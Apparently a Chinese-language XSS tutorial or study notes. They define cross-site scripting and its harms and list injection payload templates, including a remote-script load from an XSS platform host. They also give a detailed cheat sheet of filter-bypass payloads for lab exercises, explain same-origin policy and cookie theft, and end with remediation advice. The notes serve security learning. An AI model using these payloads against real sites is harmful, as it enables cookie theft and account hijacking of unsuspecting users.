## XSS的概念

CSS（Cross Site Scripting）--->>>XSS（跨站脚本攻击）

目的：让受害者js客户端运行攻击者编写的恶意js脚本。

目标：前端脚本解析引擎，比如浏览器的javascript解析引擎。

攻击的架构：B/S架构（browser<-->(http)server），少部分情况CS架构。

## XSS的危害

XSS能够产生的危害依赖于浏览器客户端脚本解析引擎的能力。

* 技术上

  窃取凭证（cookie）

  篡改DOM（篡改页面布局及内容）

  嵌入恶意的脚本代码

  发起恶意请求（Ajax）

  键盘记录

  窃取用户浏览历史

  获取客户端ip

  获取外网ip

  实现端口扫描

  获取剪贴板记录

  破解CSRF token限制

* 社会影响上

  无账号密码的情况下非法登录网站

  网络钓鱼

  网页蠕虫

  网页篡改

## XSS漏洞原理

前端用户提交的脚本代码被其他用户浏览器执行产生预期外的执行后果。（让自己提交的前端脚本代码被别人运行）。

找输入输出点   构造payload   尝试xss   如果报错   查看网页源码

html实体字符转义只有在标签属性内部才会被解析成有效的js代码,如果是被当做标签的内容,则只会解析成单纯的字符或字符串

## js执行模板

```html
<script>alert(1)</script>			//直接嵌入script
<script src=https://xsspt.com/></script>		//远程嵌入script
<input name=keyword value="" onmousemove="alert(1)">	//通过事件传入script字符串
<a hreF=javascript:alert(1)>xxx</a>  //超链接形式
或者<a href=javascr&#105;pt:alert(1)>xxxx</a>//html实体转义

<svg onload=alert(1)>
<svg><script>alert&#40;1)</script></svg>

<textarea>payload</textarea>    payload=xxx</textarea><script>alert(1)</script>
```



## XSS投放方式

1. 发链接给受害者。
2. 发文件给受害者。构造一个html文件,包含一个隐藏表单,表单中内置xss payload,编写js代码让表单自动提交(submit.click()) 

## XSS分类

- 反射型:一次性XSS,需要和服务器交互
- 存储型:持久性XSS,存在数据库中,需要与服务器交互
- DOM型:一次性XSS,不与服务器交互

## XSS绕过

1. 大小写绕过
2. 双写绕过
3. 换行绕过
4. `替换引号和括号绕过
5. 生僻元素绕过:<svg>
6. 注释绕过:`//   <!-- -->     --!>`
7. 拉丁字母绕过,常用网站:https://unicode-table.com/cn/blocks/latin-extended-a/
8. img标签不写右尖括号
9. 提前嵌入反斜杠绕过
10. 编码绕过:html实体化编码,js内置函数:String.fromCharCode()编码,url编码,base64编码绕过

## 绕过总结

```javascript
对于一个输入点,可以直接尝试输入	xxx"><scRipt>alert('onblur=alert")</scRipt> 	来测试该输入点对大小写和script标签事件和引号、尖括号、正斜杠的的过滤情况

如果输入点对输入的数据没有任何过滤,可直接采用闭合value,增加事件的方式触发XSS==》 	 x"onmousemove="alert(1)"

如果双引号被替换成html实体编码,可以尝试使用单引号,也许单引号没有被过滤

如果尖括号被过滤,引号没有被过滤,可以尝试给原有的标签添加事件来触发xss

如果输入点过滤了script标签,过滤了各种事件,可以尝试闭合输入框,添加一个超链接,以超链接的形式触发XSS ==>	xxx"><a href="javascript:alert(1)">asd</a>

如果script等关键字眼被过滤掉了,可以尝试大小写绕过,双写绕过,编码绕过等 ==>		"><scrscRiptipt>alert(1)</scrscRiptipt>

在页面上看不到输入点的时候,可以翻看网页源码,有可能有开发人员开发的时候遗留的或者业务需要而把type设置成hidden的输入点,如果是GET请求方法的可以直接在地址栏后面跟上变量名尝试输入点是否有效比如：http://192.168.96.135/xss-labs/level10.php?keyword=well%20done!&t_sort=1"type=text    //地址栏还可以输入type=text将隐藏框显示出来，但是一定要注意先将value闭合&t_sort=1"type=text

有些网页会将http请求头里的内容一并提交到后端，可以使用modheader插件构造header里的payload

如果输入点过滤了括号导致无法执行方法,可以使用反引号``代替括号()  ==>		<script>alert`1`</script>

如果输入点在注释符内:<!--   注释内容  -->  ;并且过滤了闭合符-->,可以使用--!>闭合注释  编写payload

如果前端是通过replace(/auto|on.*=|>/ig, '_')这种形式过滤事件和闭合符,过滤事件的时候,只能过滤到onmousemove=    如果中间多了换行符,就可能匹配不到,但是
onmousemove
=;这种情况在浏览器中会被解析成onmousemove= 一样的效果,但是关键字不能换行,关键字被换行符分隔后就会失效

如果遇到输入点在标签对中间,且任何完整的标签都被过滤的情况,可以尝试用单标签,且不闭合<img src=xx onerror="alert(1)"   浏览器会帮我们自动补全

如果标签被过滤,可以尝试将标签的右尖括号放到下一行,也许多了换行符就不在正则范围内,但是浏览器正常解析

如果输出点在标签的src属性中,并且过滤要求填写正确的url,可以尝试在填入正确的url后再构造payload。比如https://www.segmentfault.comx"onerror="alert(1)

JS语句是严格区分大小写的,如果提交的payload被全部替换成大写,就会导致payload失效,此时可以使用编码的方式绕过,比如:<a href="javascript:&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">点我有奖</a>

-->  可以在script标签中当成单行注释使用!

如果输入点或者输入点使用了这种过滤方式,replace(/<([a-zA-Z])/g, '<_$1'),并且调用了toLowerCase()或者toLowerCase()之类的方法,可以尝试使用拉丁文去绕过正则,然后后面的函数会将拉丁文转成英文,拉丁字符参考网站:https://unicode-table.com/cn/blocks/latin-extended-a/



replace(/-->/g, '😂')   如果XSS输入或输出点被注释,且注释符被正则替换,可以使用  --!>  去结尾,绕过这种正则

```

## 浏览器同源安全策略

### 同源的概念

A网页设置的cookie,B网页不能读取,除非这两个网页同源

判断同源的根据:协议,域名,端口都一致(可以是任意路径)

#### 同源的反义词:跨域

植入xss代码后,可以将cookie发送到xss平台的原因:xss被引入到当前页面后,就相当于和当前页面是同源页面

### http-only

一个服务器下发给客户端的http响应头的字段内容

### 安全策略下的通信

### http-only属性开启的情况下

浏览器仍然可以自动带上cookie访问当前页面网站

一般默认情况下:当页面中的js代码去访问其他网站是,不会自动带上cookie访问非同源网站,cookie就无法传递

### 非同源的情况下

1. cookie、localStorage和Index DB无法读取
2. DOM无法获得
3. AJAX请求不能发送

#### 具体的应用

​	网站js不能读取非同源网站的cookie，不能操作其他网站的DOM

不受跨域限制：

​	提交表单不受同源策略的限制，如网站js能够读取cookie并传给其他服务器（http-only未开启的情况下）

​	从跨域的网站上读取`<img>;<iframe>;<link>`不受限制

## XSS修复思路

1. 对普通字符的输入点输入的内容进行html实体化编码,对输入的href是属性值编写正确的正则进行匹配

2. 对于富文本输入的场景,采用既有的成熟的富文本输入框架

   富文本: 所谓富文本(Rich Text Format, RTF),就是包含各种格式的文字。

   类似:

   ![img](XSS%E7%AC%94%E8%AE%B0.assets/7c4468ee4b6d471ea6d933c8319c9c60.png)